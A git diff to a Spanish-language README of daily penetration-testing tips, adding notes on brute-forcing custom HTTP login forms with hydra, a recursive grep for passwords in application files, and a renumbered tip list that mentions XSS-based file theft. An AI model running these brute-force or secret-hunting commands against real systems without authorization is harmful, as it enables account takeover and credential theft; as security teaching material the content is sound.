@@ -11,7 +11,8 @@ En este repo quiero contribuir una vez al día, diariamente publicare una técni
 - [Tip 8:  Acceso a cualquier archivo en Windows con SeBackupPrivilege](#tip-8-Acceso-a-cualquier-archivo-en-Windows-con-SeBackupPrivilege)
 - [Tip 9:  Port Forwarding con SSH](#tip-9-port-forwarding-con-ssh)
 - [Tip 10: Fuerza bruta con hydra al protocolo HTTP](#tip-10-fuerza-bruta-con-hydra-al-protocolo-http)
-- [Tip 11: Modulo para MSSSQL en netexec](#tip-11-modulo-para-mssql-en-netexec)
+- [Tip 11: Busqueda de informacion con grep](#tip-11-busqueda-de-informacion-con-grep)
+- [Tip 12: Modulo para MSSSQL en netexec](#tip-12-modulo-para-mssql-en-netexec)
 ## Tip #1: Lectura de archivos desde un XSS
 Al descubrir un XSS se puede realizar la lectura de archivos locales mediante peticiones a un servidor web propio, la idea es enviar el XSS payload a un usuario que si pueda acceder a ciertos archivos del servidor, por ejemplo el archivo .htpasswd, a continuación muestro el payload:
 ```javascript
@@ -469,8 +470,8 @@ Read data files from: /usr/share/nmap
 Ahora cuando queramos iniciar un ataque al puerto ```8080``` de la maquina remota todos los comandos los debemos enviar a nuestro puerto local ```1234``` y SSH se encargara del resto.
 
 ## Tip #10: Fuerza bruta con hydra al protocolo HTTP
-## Simple http login
 ## Custom http login
+Se puede realizar fuerza bruta en logins personalizados solo obteniendo los parametros a enviar en la petición, esto se realiza mediante burpsuite y posteriormente se especifica a hydra de la siguiente forma ````dominio metodo "/ruta-del-login:parametro1=^USER^&parametro2=^PASS^&Login=Login:<Texto si el login es invalido>"```
 ```bash
 ┌──(root㉿pentest)-[~]
 └─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /root/Desktop/wordlists/100-common-passwords.txt target.com http-post-form \ "/login:username=^USER^&password=^PASS^&Login=Login:Invalid username or password"
@@ -484,6 +485,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 04:57:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-14 04:58:05
 ```
 ## Tip #11: Busqueda de informacion con grep
+En ocaciones puedes archivos de configuracion por medio de palabras clave entre muchos archivos con ```grep``` de la siguiente forma:
 ```bash
 root@pentest:/app# ls
 app.py  instance  static  templates  uploads
@@ -491,3 +493,4 @@ app.py  instance  static  templates  uploads
 root@pentest:/app/# grep -r password
 Binary file instance/database.db matches
 ```
+## Tip #12: Modulo para MSSSQL en netexec
